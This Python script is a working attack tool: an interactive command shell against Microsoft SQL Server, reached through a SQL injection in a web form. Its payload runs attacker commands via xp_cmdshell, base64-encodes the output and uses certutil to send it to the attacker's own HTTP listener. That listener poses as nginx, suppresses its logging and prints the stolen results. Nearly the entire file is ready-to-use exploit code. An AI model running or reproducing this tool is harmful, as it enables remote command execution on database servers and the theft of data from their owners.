
'''
Description: Reverse MSSQL shell through xp_cmdshell + certutil for exfiltration (now in py3)
Author: @xassiz

Update python3
Author: ksaadDE (python3 update)

inner-working:
1. launch websrv
2. waits 4 command
3. if you send command (e.g. dir) it will use xp_cmdshell on mssql server and certutil to make a http request to our websrv
4. decode b64 and utf8 (ascii works too), HTTP-GET result on our websrv (by certutils).
5. print the result
6. 302 to http://127.0.0.1
7. go to 2
'''

import sys
import requests
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import base64
import html

gotResult  = False
target_url = "http://targetip/xxx.asp"
local_port = 4444
local_url  = "http://localip:{}/special/".format(local_port)

# rewrite of lamda func of original code
def b64pad (x):
   return x.ljust(len(x) + (4-len(x) % 4), '=')


def base64_dec (x):
   x = x.replace("/","")        # replace beginning / with ""
   x = b64pad (x)               # b64 paddings (the = at the end)
   x = x.replace(chr(0),'')     # replaces the 0x00 chrs
   x = base64.b64decode(x)      # decodes the b64
   x = str(x.decode('utf-8'))   # decodes to utf8
   return html.unescape(x)      # uses the HTML library to ensure that &gt, &#62 etc is correctly converted (seems to be buggy :( )

def get_command():
    try:
        cmd = input(':\> ')
        t = threading.Thread(target=send_command, args=(cmd,))
        t.start()
    except Exception as e:
        print(e)
        sys.exit(0)

def send_command (cmd):
    global target_url, local_url

    payload  = "';"
    payload += "declare @r varchar(4120),@cmdOutput varchar(4120);"
    payload += "declare @res TABLE(line varchar(max));"
    payload += "insert into @res exec xp_cmdshell '%s';"
    payload += "set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);"
    payload += "set @r=concat('certutil -urlcache -f %s',@cmdOutput);"
    payload += "exec xp_cmdshell @r;"
    payload += "--"

    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
    h = {'User-Agent':user_agent}

    # Customize from here
    p = {
          '--> VULN FORM VAR <--':payload % (cmd, local_url)
        }

    requests.get (target_url, headers=h, params=p)



# stolen from https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7
class S(BaseHTTPRequestHandler):
    server_version = "nginx" # override server_version

    # epic forwarding of non /special route access (can be tracked using f12 in browser or curl headers
    def sendDefaultHeaders (self,):
        self.send_response (301)
        self.send_header ('Content-type', 'text/html')
        self.send_header ('Location', 'http://127.0.0.1')
        self.end_headers ()

    # nginx version_string override - do not remove
    def version_string (self,):
        return "nginx"
    
    # disabled logging - do not remove
    def log_message(self, format, *args):
        pass

    def _set_response(self):
        self.sendDefaultHeaders ()
        pass

    # process the incoming get requests
    def do_GET(self):
        global gotResult

        # select /special route
        if len(self.path) > 0 and self.path.startswith("/special/"):

            # only get first result, speeds up everything! (old code waited for the second result using queryid mod 2)
            if not gotResult:
                print (base64_dec (self.path.replace("/special/","")))

            # invert the bool
            gotResult = not gotResult

        # 301 to 127.0.0.1
        self.sendDefaultHeaders ()
        pass

    def do_POST(self):
        pass

def run(port=4444, server_class=HTTPServer, handler_class=S):
    logging.basicConfig(level=logging.INFO)
    server_address = ('0.0.0.0', port) # run public
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv
    t=threading.Thread(target=run, args=(local_port,))
    t.start ()
    while True:
    	get_command ()
